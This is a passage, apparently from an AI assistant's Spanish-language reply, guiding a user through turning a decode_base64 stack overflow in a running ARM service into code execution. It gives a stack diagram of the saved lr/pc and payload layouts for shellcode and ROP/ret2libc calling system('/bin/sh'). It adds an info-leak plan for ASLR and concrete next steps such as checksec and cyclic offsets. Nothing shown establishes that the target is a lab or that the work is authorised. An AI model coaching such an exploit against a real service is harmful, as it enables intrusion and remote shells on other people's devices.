     [ saved r5   ]                                                                                                                                                                                                                      
     [ saved r6   ]                                                                                                                                                                                                                      
     [ saved r7   ]                                                                                                                                                                                                                      
     [ saved r8   ]                                      
     [ saved fp   ]
     [ saved lr   ]    ← ESTO se vuelve pc cuando hace pop {..., pc}
     ───────────────────────────────────                                                                                                                                                                                                 
     Direcciones altas
                                                                                                                                                                                                                                         
  Después de mandar ~536-540 bytes (buf + locals + 6 saved regs), llegás al saved lr. Ese byte 537+ es el primero que controla pc.                                                                                                       
   
  Lo que ya conseguiste (importante)                                                                                                                                                                                                     
                                                         
  ▎ "lo probé y me hace un crash en el servicio haciendo saltar a cualquier function"                                                                                                                                                    
   
  ✅ Esto es la confirmación que necesitabas. Si pc = 0x41414141 y el servicio crashea con SIGSEGV en esa dirección, vos controlás pc. Ya tenés:                                                                                         ─
                                                         
     ✅ Vulnerabilidad identificada (decode_base64 sin bounds)                                                                                                                                                                            
     ✅ Offset al saved_pc encontrado (por el crash)                                                                                                                                                                                      
     ✅ Capacidad de hacer arbitrary jump                                                                                                                                                                                                ─
                                                                                                                                                                                                                                         
  Esto es "primitive: arbitrary control of PC". Es la etapa 1 del exploit.                                                                                                                                                               
                                                         
  La etapa 2 — convertirlo en algo útil                                                                                                                                                                                                  
                                                         
  Tenés tres caminos típicos según las protecciones del binario:                                                                                                                                                                         
                                                         
  A. NX off (stack ejecutable)                                                                                                                                                                                                           
                                                         
  Si el binario es viejo / embebido y el stack es ejecutable:                                                                                                                                                                            
                                                         
     payload = shellcode + padding + dirección_del_buffer                                                                                                                                                                                
                                        ↓                                                                                                                                                                                                
                                     pc salta al shellcode
                                                                                                                                                                                                                                         
  Verificalo con checksec o mirando ELF flags.                                                                                                                                                                                           
                                                                                                                                                                                                                                         
  B. NX on, no ASLR (típico embebido / IoT)                                                                                                                                                                                              
                                                         
  Acá es donde entra ROP / ret2libc, lo que estábamos hablando:                                                                                                                                                                          
                                                         
     payload = padding(512+gap+24) +                                                                                                                                                                                                     
               gadget_pop_r0_pc +                                                                                                                                                                                                        
               address_de_/bin/sh +                                                                                                                                                                                                      
               system_plt                                                                                                                                                                                                                
                                                                                                                                                                                                                                         
  Necesitás:                                             
  1. Encontrar pop {r0, pc} o equivalente.                                                                                                                                                                                               
  2. Tener una string /bin/sh en memoria (puede estar en el binario, en libc, o la podés meter vos en el buffer si conocés su dirección).                                                                                                
  3. La dirección de system@plt.                                                                                                         
                                                                                                                                                                                                                                         
  C. NX on + ASLR                                                                                                                                                                                                                        
                                                                                                                                                                                                                                         
  Necesitás un info leak antes para resolver direcciones de libc. Más complicado, pero el flow general es:                                                                                                                               
                                                         
     1. Triggear un info leak para conocer libc base                                                                                                                                                                                     
     2. Calcular system, "/bin/sh" en runtime                                                                                                                                                                                            
     3. Mandar la cadena ROP con direcciones derivadas                                                                                                                                                                                   
                                                                                                                                                                                                                                         
  El próximo paso concreto                                                                                                                                                                                                               
                                                                                                                                                                                                                                         
  Antes de armar la cadena, contestá estos 4:                                                                                                                                                                                            
   
     1. ¿checksec sobre el binario qué dice?                                                                                                                                                                                             
        $ checksec --file=./binario                                                                                                                                                                                                      
        → te dice NX, ASLR, PIE, RELRO, canaries                                                                                                                                                                                         
                                                                                                                                                                                                                                         
     2. ¿Cuál es exactamente el offset al saved pc?                                                                                                                                                                                      
        → "saltó a 0x41414141" → contá los AAAA antes de eso                                                                                                                                                                             
        → o usá cyclic pattern (pwntools cyclic)                                                                                                                                                                                         
                                                                                                                                                                                                                                         
     3. ¿Tenés acceso al binario o a la libc?                                                                                                                                                                                            
        → Lo necesitás para gadgets y para conocer offsets                                                                                                                                                                               
        → si es firmware embebido, extrael                                                                                                                                                                                               
                                                                        
